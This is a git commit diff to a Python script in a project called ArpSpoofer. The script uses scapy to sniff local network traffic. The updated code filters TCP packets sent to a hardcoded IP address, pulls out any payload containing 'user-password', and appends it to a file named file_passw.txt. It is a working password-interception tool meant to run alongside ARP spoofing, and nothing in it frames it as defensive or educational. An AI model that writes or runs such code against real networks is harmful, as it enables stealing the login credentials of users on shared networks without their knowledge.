78932e29f659c799176659c950cadfa35d837d33
MRAZy123 <104674200+Moroz314@users.noreply.github.com>
2024-12-25 22:19:08 +0300

    Update listen_packets.py

--- ArpSpoofer/listen_packets.py
+++ ArpSpoofer/listen_packets.py
@@ -3,19 +3,17 @@ from scapy.packet import Packet
 
 
 def process_packet(packet: Packet):
+  
     if packet.haslayer(TCP):
-        if packet[Ether].src == "victim_ip":
+        if packet[IP].dst == "192.168.23.8":
                 if Raw in packet:
                     try:
-                        data = packet[Raw].load.decode('utf-8')
-                        data = json.loads(data)
-                        print(data)
-                    except:
-                        print(packet[Raw].load)
+                        text = packet[Raw].load.decode('utf-8')
+                        if "user-password" in text:
+                            with open("file_passw.txt", 'a') as f:
+                                 f.write(text)
+                            print(text)
+                    except: 
+                         pass
 
-
-
-
-
-cap = sniff(prn=process_packet)
-
+cap = sniff(prn=process_packet, iface="Realtek PCIe GbE Family Controller")
